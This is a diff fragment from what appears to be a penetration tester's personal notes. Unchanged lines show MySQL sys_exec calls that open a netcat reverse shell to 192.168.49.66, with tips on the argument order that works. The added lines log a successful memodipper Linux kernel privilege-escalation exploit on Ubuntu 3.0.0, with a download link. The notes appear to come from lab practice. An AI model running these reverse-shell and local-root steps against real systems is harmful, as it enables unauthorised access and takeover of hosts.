@@ -668,4 +668,13 @@ select sys_exec('nc 192.168.49.66 22 -e /bin/bash');
 ***Note: I was only able to get a connection with the above syntax. It needs to be in that order for it to connect.***
 ***Note: /bin/sh works AND this did too... select sys_exec('nc -e /bin/bash 192.168.49.66 21');
 ***UPDATE: You cant split the command -e in the front and /bin/sh at the back. Pick front load or backload.
+```
 
+# LINUX KERNEL EXPLOITS
+```bash
+Success:
+OS: Linux version 3.0.0-12-server (buildd@crested) (gcc version 4.6.1 (Ubuntu/Linaro 4.6.1-9ubuntu3) ) #20-Ubuntu SMP Fri Oct 7 16:36:30 UTC 2011
+Memodripper https://www.kernel-exploits.com/media/memodipper.c
+x64 on Kali worked natty. x86 on my Ubuntu was not reconized. Makes sense.
+
+```
